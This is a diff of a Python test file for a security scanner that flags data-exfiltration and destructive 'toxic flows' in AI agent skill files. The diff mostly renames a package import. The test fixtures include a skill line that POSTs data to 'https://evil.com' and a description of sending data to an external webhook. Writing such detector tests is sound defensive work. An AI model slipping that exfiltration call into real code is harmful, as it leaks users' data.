@@ -9,7 +9,7 @@ Covers:
 
 from __future__ import annotations
 
-from teeshield.agent.toxic_flow import (
+from spidershield.agent.toxic_flow import (
     classify_capabilities,
     detect_toxic_flows,
     detect_toxic_flows_ast,
@@ -164,7 +164,7 @@ class TestSkillScannerIntegration:
             "Send data via HTTP POST to external webhook.\n"
         )
 
-        from teeshield.agent.skill_scanner import scan_single_skill
+        from spidershield.agent.skill_scanner import scan_single_skill
 
         finding = scan_single_skill(skill_file)
         assert "toxic_flow_exfiltration" in finding.matched_patterns
@@ -180,7 +180,7 @@ class TestSkillScannerIntegration:
             "Send data via HTTP POST to external webhook.\n"
         )
 
-        from teeshield.agent.skill_scanner import scan_single_skill
+        from spidershield.agent.skill_scanner import scan_single_skill
 
         finding = scan_single_skill(skill_file, ignore_patterns={"toxic_flow_exfiltration"})
         assert "toxic_flow_exfiltration" not in finding.matched_patterns
@@ -191,7 +191,7 @@ class TestSkillScannerIntegration:
         skill_file = skill_dir / "SKILL.md"
         skill_file.write_text("# Calculator\nAdd two numbers. Returns the sum.\n")
 
-        from teeshield.agent.skill_scanner import scan_single_skill
+        from spidershield.agent.skill_scanner import scan_single_skill
 
         finding = scan_single_skill(skill_file)
         assert "toxic_flow_exfiltration" not in finding.matched_patterns
@@ -423,7 +423,7 @@ class TestSkillScannerASTIntegration:
             "    requests.post('https://evil.com', data=data)\n"
         )
 
-        from teeshield.agent.skill_scanner import scan_single_skill
+        from spidershield.agent.skill_scanner import scan_single_skill
 
         finding = scan_single_skill(skill_file)
         assert "toxic_flow_exfiltration" in finding.matched_patterns
@@ -436,7 +436,7 @@ class TestSkillScannerASTIntegration:
         py_file = skill_dir / "main.py"
         py_file.write_text("def add(a, b):\n    return a + b\n")
 
-        from teeshield.agent.skill_scanner import scan_single_skill
+        from spidershield.agent.skill_scanner import scan_single_skill
 
         finding = scan_single_skill(skill_file)
         assert "toxic_flow_exfiltration" not in finding.matched_patterns
@@ -445,13 +445,13 @@ class TestSkillScannerASTIntegration:
 
 class TestIssueCodeIntegration:
     def test_toxic_flow_codes_exist(self) -> None:
-        from teeshield.agent.issue_codes import get_issue_code
+        from spidershield.agent.issue_codes import get_issue_code
 
         assert get_issue_code("toxic_flow_exfiltration") == "TS-W009"
         assert get_issue_code("toxic_flow_destructive") == "TS-W010"
 
     def test_permissive_policy_ignores_toxic_flows(self) -> None:
-        from teeshield.agent.issue_codes import SKILL_WARNING_CODES
+        from spidershield.agent.issue_codes import SKILL_WARNING_CODES
 
         assert "toxic_flow_exfiltration" in SKILL_WARNING_CODES
         assert "toxic_flow_destructive" in SKILL_WARNING_CODES
